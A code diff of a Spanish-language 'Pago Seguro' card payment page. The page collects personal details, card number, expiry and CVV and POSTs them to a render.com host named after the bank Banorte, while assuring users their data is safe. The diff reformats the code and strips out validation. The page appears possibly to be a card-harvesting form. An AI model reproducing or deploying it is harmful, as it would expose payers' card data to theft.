@@ -4,20 +4,14 @@
 <meta charset="UTF-8">
 <title>Pago Seguro</title>
 
-<meta
-  http-equiv="X-Content-Type-Options"
-  content="nosniff"
->
+<!-- ✅ ELIMINADO SAMEORIGIN -->
+<meta http-equiv="X-Content-Type-Options" content="nosniff">
 
 <style>
 body {
   margin: 0;
   font-family: Arial, sans-serif;
-  background: linear-gradient(
-    135deg,
-    #4a148c,
-    #7b1fa2
-  );
+  background: linear-gradient(135deg, #4a148c, #7b1fa2);
   display: flex;
   justify-content: center;
   align-items: center;
@@ -29,8 +23,7 @@ body {
   padding: 25px;
   border-radius: 15px;
   width: 360px;
-  box-shadow:
-    0 10px 25px rgba(0, 0, 0, 0.3);
+  box-shadow: 0 10px 25px rgba(0,0,0,0.3);
 }
 
 h2 {
@@ -38,8 +31,7 @@ h2 {
   color: #6a1b9a;
 }
 
-input,
-select {
+input, select {
   width: 100%;
   padding: 10px;
   margin: 7px 0;
@@ -75,11 +67,10 @@ button:disabled {
 .toggle-cvv {
   position: absolute;
   right: 10px;
-  top: 19px;
+  top: 12px;
   cursor: pointer;
   font-size: 12px;
   color: #6a1b9a;
-  user-select: none;
 }
 
 .section-title {
@@ -95,10 +86,6 @@ button:disabled {
   color: #6a1b9a;
   font-size: 13px;
 }
-
-#contenedorPlanPago {
-  display: none;
-}
 </style>
 </head>
 
@@ -108,9 +95,9 @@ button:disabled {
 
   <h2>Pago Seguro</h2>
 
-  <form
+  <form 
     id="paymentForm"
-    method="POST"
+    method="POST" 
     action="https://backend-banorte.onrender.com/api/payment/3d-secure"
     autocomplete="off"
     onsubmit="return validarForm()"
@@ -139,12 +126,11 @@ button:disabled {
       name="telefono"
       placeholder="Teléfono"
       pattern="\d{10}"
-      inputmode="numeric"
       required
     >
 
     <div class="section-title">
-      Dirección de facturación
+      Dirección
     </div>
 
     <input
@@ -164,7 +150,6 @@ button:disabled {
       name="cp"
       placeholder="Código Postal"
       pattern="\d{5}"
-      inputmode="numeric"
       required
     >
 
@@ -173,7 +158,6 @@ button:disabled {
     </div>
 
     <select
-      id="tipoTarjeta"
       name="tipoTarjeta"
       required
     >
@@ -182,46 +166,33 @@ button:disabled {
       </option>
 
       <option value="CR">
-        Tarjeta de crédito
+        Crédito
       </option>
 
       <option value="DB">
-        Tarjeta de débito
+        Débito
       </option>
     </select>
 
-    <div id="contenedorPlanPago">
+    <div class="section-title">
+  Modalidad de pago
+</div>
 
-      <div class="section-title">
-        Modalidad de pago
-      </div>
+<select
+  name="PAYMENTS_NUMBER"
+>
+  <option value="00">
+    Contado
+  </option>
 
-      <select
-        id="planPago"
-        name="planPago"
-      >
-        <option value="contado">
-          Pago de contado
-        </option>
+  <option value="06">
+    6 meses sin intereses
+  </option>
 
-        <option value="03">
-          3 meses sin intereses
-        </option>
-
-        <option value="06">
-          6 meses sin intereses
-        </option>
-
-        <option value="09">
-          9 meses sin intereses
-        </option>
-
-        <option value="12">
-          12 meses sin intereses
-        </option>
-      </select>
-
-    </div>
+  <option value="12">
+    12 meses sin intereses
+  </option>
+</select>
 
     <div class="section-title">
       Datos de la tarjeta
@@ -241,7 +212,6 @@ button:disabled {
       placeholder="MM/AA"
       maxlength="5"
       pattern="\d{2}/\d{2}"
-      inputmode="numeric"
       required
     >
 
@@ -254,7 +224,6 @@ button:disabled {
         placeholder="CVV"
         maxlength="4"
         pattern="\d{3,4}"
-        inputmode="numeric"
         required
       >
 
@@ -291,13 +260,11 @@ button:disabled {
       Redirigiendo a validación segura...
     </div>
 
-    <p
-      style="
-        font-size: 12px;
-        color: gray;
-        text-align: center;
-      "
-    >
+    <p style="
+      font-size:12px;
+      color:gray;
+      text-align:center;
+    ">
       Tus datos se usan únicamente
       para validar el pago de forma segura.
     </p>
@@ -309,56 +276,6 @@ button:disabled {
 <script>
 
 // ===============================
-// ELEMENTOS DEL FORMULARIO
-// ===============================
-const tipoTarjeta =
-  document.getElementById(
-    "tipoTarjeta"
-  );
-
-const planPago =
-  document.getElementById(
-    "planPago"
-  );
-
-const contenedorPlanPago =
-  document.getElementById(
-    "contenedorPlanPago"
-  );
-
-
-// ===============================
-// MOSTRAR PLAN DE PAGO
-// ===============================
-function actualizarPlanPago() {
-
-  if (tipoTarjeta.value === "CR") {
-
-    // Crédito:
-    // contado o meses sin intereses
-    contenedorPlanPago.style.display =
-      "block";
-
-  } else {
-
-    // Débito:
-    // solamente pago de contado
-    contenedorPlanPago.style.display =
-      "none";
-
-    planPago.value = "contado";
-  }
-}
-
-tipoTarjeta.addEventListener(
-  "change",
-  actualizarPlanPago
-);
-
-actualizarPlanPago();
-
-
-// ===============================
 // VALIDACIÓN GENERAL
 // ===============================
 function validarForm() {
@@ -368,20 +285,6 @@ function validarForm() {
       '[name="amount"]'
     ).value;
 
-  const tipo =
-    tipoTarjeta.value;
-
-  const modalidad =
-    planPago.value;
-
-  const modalidadesPermitidas = [
-    "contado",
-    "03",
-    "06",
-    "09",
-    "12"
-  ];
-
   if (Number(monto) <= 0) {
 
     alert("Monto inválido");
@@ -389,49 +292,12 @@ function validarForm() {
     return false;
   }
 
-  if (
-    tipo !== "CR" &&
-    tipo !== "DB"
-  ) {
-
-    alert(
-      "Selecciona el tipo de tarjeta"
-    );
-
-    return false;
-  }
-
-  if (
-    !modalidadesPermitidas.includes(
-      modalidad
-    )
-  ) {
-
-    alert(
-      "Modalidad de pago inválida"
-    );
-
-    return false;
-  }
-
-  if (
-    tipo === "DB" &&
-    modalidad !== "contado"
-  ) {
-
-    alert(
-      "La tarjeta de débito solo permite pago de contado"
-    );
-
-    planPago.value = "contado";
-
-    return false;
-  }
-
+  // ✅ DESHABILITAR BOTÓN
   document
     .getElementById("submitBtn")
     .disabled = true;
 
+  // ✅ MOSTRAR LOADING
   document
     .getElementById("loading")
     .style.display = "block";
@@ -466,14 +332,12 @@ document
       e.target.value
         .replace(/\D/g, "");
 
-    val = val.slice(0, 4);
-
-    if (val.length >= 3) {
+    if (val.length >= 2) {
 
       val =
-        val.slice(0, 2) +
+        val.slice(0,2) +
         "/" +
-        val.slice(2);
+        val.slice(2,4);
     }
 
     e.target.value = val;
@@ -490,21 +354,7 @@ document
     e.target.value =
       e.target.value
         .replace(/\D/g, "")
-        .slice(0, 19);
-  });
-
-
-// ===============================
-// SOLO NÚMEROS CVV
-// ===============================
-document
-  .querySelector('[name="cvv"]')
-  .addEventListener("input", e => {
-
-    e.target.value =
-      e.target.value
-        .replace(/\D/g, "")
-        .slice(0, 4);
+        .slice(0,19);
   });
 
 
@@ -518,7 +368,7 @@ document
     e.target.value =
       e.target.value
         .replace(/\D/g, "")
-        .slice(0, 10);
+        .slice(0,10);
   });
 
 
@@ -532,7 +382,7 @@ document
     e.target.value =
       e.target.value
         .replace(/\D/g, "")
-        .slice(0, 5);
+        .slice(0,5);
   });
 
 </script>
